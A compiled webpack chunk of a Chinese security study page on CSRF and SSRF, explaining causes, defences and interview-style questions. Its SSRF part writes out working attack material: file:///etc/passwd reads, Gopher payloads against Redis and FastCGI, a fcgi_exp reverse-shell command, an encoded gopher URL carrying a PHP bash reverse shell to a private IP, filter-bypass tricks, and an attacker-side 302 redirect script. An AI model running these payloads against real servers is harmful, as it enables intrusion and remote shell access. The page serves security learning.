(window.webpackJsonp=window.webpackJsonp||[]).push([[73],{745:function(s,t,a){"use strict";a.r(t);var n=a(103),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"csrf"}},[s._v("CSRF "),a("a",{staticClass:"header-anchor",attrs:{href:"#csrf"}},[s._v("#")])]),s._v(" "),a("p",[s._v("CSRF是跨站请求伪造攻击，由客户端发起，是由于没有在执行关键操作时，进行"),a("code",[s._v("是否由用户自愿发起的")]),s._v("确认攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。")]),s._v(" "),a("p",[s._v("比如某网站"),a("strong",[s._v("用户信息修改")]),s._v("功能，没有验证Referer也没添加Token，攻击者可以用HTML构造恶意代码提交POST请求，诱骗已经登陆的受害者点击，可以直接修改用户信息")]),s._v(" "),a("p",[a("strong",[s._v("修复建议")])]),s._v(" "),a("blockquote",[a("ul",[a("li",[s._v("验证Referer")]),s._v(" "),a("li",[s._v("添加token")])])]),s._v(" "),a("p",[a("strong",[s._v("token和referer做横向对比，谁安全等级高？")])]),s._v(" "),a("p",[s._v("token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。token的话，要遵守不可预测性原则，保证其随机性（ 通过当前时间戳生成随机数 ）")]),s._v(" "),a("p",[a("strong",[s._v("对referer的验证，从什么角度去做？如果做，怎么杜绝问题")])]),s._v(" "),a("p",[s._v("对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。\n为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。")]),s._v(" "),a("p",[a("strong",[s._v("针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？")])]),s._v(" "),a("p",[s._v("针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等;")]),s._v(" "),a("p",[s._v("二是结合信息泄露漏洞对它的获取，结合着发起组合攻击;")]),s._v(" "),a("p",[s._v("信息泄露有可能是缓存、日志、get，也有可能是利用跨站;")]),s._v(" "),a("p",[s._v("很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了;")]),s._v(" "),a("h2",{attrs:{id:"ssrf"}},[s._v("SSRF "),a("a",{staticClass:"header-anchor",attrs:{href:"#ssrf"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SSRF(Server-Side Request Forgery:服务器端请求伪造)  是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。")]),s._v(" "),a("p",[s._v("攻击的目标是从外网无法访问的内部系统\t( 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 )")]),s._v(" "),a("p",[a("strong",[s._v("SSRF 成因")]),s._v("是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制 (没有做合法性验证)。")]),s._v(" "),a("h3",{attrs:{id:"出现场景"}},[s._v("出现场景 "),a("a",{staticClass:"header-anchor",attrs:{href:"#出现场景"}},[s._v("#")])]),s._v(" "),a("p",[s._v("能够对外发起网络请求的地方，就可能存在 SSRF 漏洞。")]),s._v(" "),a("p",[s._v("在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。")]),s._v(" "),a("p",[s._v("从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。")]),s._v(" "),a("h3",{attrs:{id:"检测"}},[s._v("检测 "),a("a",{staticClass:"header-anchor",attrs:{href:"#检测"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SSRF漏洞的验证方法：")]),s._v(" "),a("blockquote",[a("p",[s._v("1）通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞")]),s._v(" "),a("p",[s._v("2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞")])]),s._v(" "),a("h3",{attrs:{id:"常见防御和绕过"}},[s._v("常见防御和绕过 "),a("a",{staticClass:"header-anchor",attrs:{href:"#常见防御和绕过"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("检查Host是否是内网IP")]),s._v(" ；IP地址转换绕过，DNS解析绕过(xip.io)，利用URL解析器滥用")]),s._v(" "),a("p",[a("strong",[s._v("限制可用协议和请求端口")]),s._v("(HTTP、HTTPS；80、443)；302跳转绕过")]),s._v(" "),a("p",[a("strong",[s._v("禁止跳转")]),s._v("；")]),s._v(" "),a("p",[a("strong",[s._v("URL长度限制")]),s._v("；短链接："),a("a",{attrs:{href:"https://tinyurl.com/",target:"_blank",rel:"noopener noreferrer"}},[s._v("生成短链接的网站"),a("OutboundLink")],1)])]),s._v(" "),a("h4",{attrs:{id:"攻击利用方法"}},[s._v("攻击利用方法 "),a("a",{staticClass:"header-anchor",attrs:{href:"#攻击利用方法"}},[s._v("#")])]),s._v(" "),a("h4",{attrs:{id:"内网端口扫描"}},[a("strong",[s._v("内网端口扫描")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#内网端口扫描"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("ssrf.php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:3306\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#探测是否存在MySQL服务")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"file协议读取内网文件"}},[a("strong",[s._v("file协议读取内网文件")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#file协议读取内网文件"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("ssrf.php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("file:///etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"gopher打redis"}},[a("strong",[s._v("GOPHER打redis")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#gopher打redis"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("**条件：**能未授权或者通过弱口令认证访问到Redis服务器")])]),s._v(" "),a("p",[s._v("方式主要有：")]),s._v(" "),a("blockquote",[a("p",[s._v("1、绝对路径写webshell")]),s._v(" "),a("p",[s._v("2、写contrab计划任务反弹shell")])]),s._v(" "),a("p",[s._v("用脚本直接生成payload后去打就行（"),a("a",{attrs:{href:"https://github.com/LS95/gopher-redis-auth",target:"_blank",rel:"noopener noreferrer"}},[s._v("脚本在这"),a("OutboundLink")],1),s._v("，RESP协议还是要了解的，不能光会用脚本）")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" -v "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"payload内容"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"gopher打fastcgi"}},[a("strong",[s._v("GOPHER打FastCGI")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#gopher打fastcgi"}},[s._v("#")])]),s._v(" "),a("p",[s._v("一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。")]),s._v(" "),a("p",[s._v("首先根据"),a("a",{attrs:{href:"https://github.com/piaca/fcgi_exp",target:"_blank",rel:"noopener noreferrer"}},[s._v("faci_exp"),a("OutboundLink")],1),s._v("生成exp，随后改成支持gopher协议的URL")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./fcgi_exp system 目标IP "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9000")]),s._v(" /var/www/html/1.php "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"bash -i >& /dev/tcp/攻击者IP/2333 0>&1"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lvv "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2333")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\nxdd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("构造 Gopher 协议的 URL：")]),s._v(" "),a("div",{staticClass:"language-cmd line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("curl请求")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" -v "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Gopher协议的URL"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("本地监听2333端口，收到反弹shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lvv "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2333")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("a",{attrs:{href:"https://www.zhihu.com/question/30672017",target:"_blank",rel:"noopener noreferrer"}},[s._v("如何通俗地解释 CGI、FastCGI、php-fpm 之间的关系？"),a("OutboundLink")],1)]),s._v(" "),a("h3",{attrs:{id:"常见绕过方法"}},[s._v("常见绕过方法 "),a("a",{staticClass:"header-anchor",attrs:{href:"#常见绕过方法"}},[s._v("#")])]),s._v(" "),a("h4",{attrs:{id:"一、检查ip是否为内网ip"}},[s._v("一、检查IP是否为内网IP "),a("a",{staticClass:"header-anchor",attrs:{href:"#一、检查ip是否为内网ip"}},[s._v("#")])]),s._v(" "),a("p",[s._v("很多开发者认为，只要检查一下请求url的host不为内网IP，即可防御SSRF。")]),s._v(" "),a("p",[s._v("通常使用正则过滤以下5个IP段：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("192.168.0.0/16\n10.0.0.0/8\n172.16.0.0/12\n127.0.0.0/8\n0.0.0.0/8   #在Linux下，127.0.0.1与0.0.0.0都指向本地\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("这种防御方法通常可以用IP地址进制转换绕过")]),s._v(" "),a("blockquote",[a("p",[s._v("利用八进制IP地址绕过 0177.0.0.1")]),s._v(" "),a("p",[s._v("利用十六进制IP地址绕过 0x7f000001")]),s._v(" "),a("p",[s._v("利用十进制的IP地址绕过 2130706433")])]),s._v(" "),a("p",[s._v("他们一个都匹配不上正则表达式， 但实际请求都是127.0.0.1")]),s._v(" "),a("h4",{attrs:{id:"二、dns解析绕过"}},[s._v("二、DNS解析绕过 "),a("a",{staticClass:"header-anchor",attrs:{href:"#二、dns解析绕过"}},[s._v("#")])]),s._v(" "),a("p",[s._v("Host可能是IP形式，也可能是域名形式。")]),s._v(" "),a("p",[s._v("如果Host是域名形式，我们是没法直接比对的，只要其解析到内网IP上，就可以绕过。")]),s._v(" "),a("p",[s._v("网上有个神奇域名 "),a("a",{attrs:{href:"http://xip.io/",target:"_blank",rel:"noopener noreferrer"}},[s._v("http://xip.io"),a("OutboundLink")],1),s._v(" (有墙)，"),a("a",{attrs:{href:"https://www.cnblogs.com/wintrysec/p/www.127.0.0.1.xip.io",target:"_blank",rel:"noopener noreferrer"}},[s._v("www.127.0.0.1.xip.io"),a("OutboundLink")],1),s._v(",会自动解析到127.0.0.1")]),s._v(" "),a("h4",{attrs:{id:"三、利用url解析器滥用"}},[s._v("三、利用URL解析器滥用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#三、利用url解析器滥用"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。")]),s._v(" "),a("p",[s._v("这时候可能会出现对URL参数解析不当，导致可以绕过过滤")]),s._v(" "),a("p",[a("a",{attrs:{href:"http://www.baidu.com@127.0.0.1/",target:"_blank",rel:"noopener noreferrer"}},[s._v("http://www.baidu.com@127.0.0.1"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("当后端程序通过不正确的正则表达式,对上述URL的内容解析的时候")]),s._v(" "),a("p",[s._v("会认为访问URL的host为"),a("a",{attrs:{href:"https://www.cnblogs.com/wintrysec/p/www.baidu.com",target:"_blank",rel:"noopener noreferrer"}},[s._v("www.baidu.com"),a("OutboundLink")],1),s._v(",而实际上请求的是127.0.0.1上的内容")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/image-20200120223636988.png",alt:""}})]),s._v(" "),a("p",[s._v("构造CURL的payload：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" -d "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"url=http://foo@127.0.0.1:80@www.baidu.com/flag.php"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.43.157"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"四、301-302跳转绕过"}},[s._v("四、301/302跳转绕过 "),a("a",{staticClass:"header-anchor",attrs:{href:"#四、301-302跳转绕过"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("条件")])]),s._v(" "),a("blockquote",[a("p",[s._v("1.程序的合法性检验逻辑为:检查url参数的host是否为内网地址")]),s._v(" "),a("p",[s._v("2.使用的是CURL方法，并且CURLOPT_FOLLOWLOCATION为true(即跟随302/301进行跳转)")])]),s._v(" "),a("p",[a("strong",[s._v("可利用的协议：")])]),s._v(" "),a("blockquote",[a("p",[s._v("http/https ok")]),s._v(" "),a("p",[s._v("dict ok")]),s._v(" "),a("p",[s._v("gopher ok")]),s._v(" "),a("p",[s._v("file no! "),a("a",{attrs:{href:"https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("原因"),a("OutboundLink")],1)])]),s._v(" "),a("p",[a("strong",[s._v("服务端代码：")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("//ssrf.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("                                                                                                                                                \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("                                                         \n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_init")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                                       \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_URL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_HEADER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_FOLLOWLOCATION")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('//根据服务器返回 HTTP 头中的 "Location: " 重定向 ')]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_close")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                                         \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("                                                                            \n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'url'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                                         \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                                                                  \n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[a("strong",[s._v("攻击者的vps：")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("//302.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("  \n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$schema")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'schema'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ip")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'ip'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$port")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'port'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'query'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$schema")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"://"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ip")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"/"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("empty")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$port")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("  \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Location: '),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$schema")])]),s._v("://"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ip")])]),s._v("/"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")])]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Location: '),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$schema")])]),s._v("://"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ip")])]),s._v(":"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$port")])]),s._v("/"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")])]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),s._v(" 